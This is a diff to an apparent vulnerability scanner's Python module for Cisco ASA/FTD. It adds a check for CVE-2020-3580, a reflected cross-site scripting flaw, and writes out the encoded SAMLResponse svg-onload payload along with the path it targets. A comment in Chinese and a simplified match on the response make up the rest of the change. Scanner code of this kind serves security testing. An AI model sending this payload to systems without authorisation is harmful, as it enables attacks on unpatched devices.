@@ -26,11 +26,14 @@ class Cisco():
         self.cve_2020_3580_payloads = [
             {
                 'path': '+CSCOE+/saml/sp/acs?tgname=a',
-                'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dalert(\'{}\')%3e'.format(self.md)
+                'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dalert(\'{}\')%3e'.format('3580')
             }
         ]
 
     def cve_2020_3580_scan(self, url):
+        ''' Cisco ASA设备/FTD设备 XSS跨站脚本攻击
+                反射型
+        '''
         vul_info = {}
         vul_info['app_name'] = self.app_name
         vul_info['vul_type'] = 'XSS'
@@ -70,7 +73,7 @@ class Cisco():
                 logger.logging(vul_info)
                 return None
 
-            if self.md in check.check_res(res.text, self.md):
+            if ("alert('3580')" in res.text):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
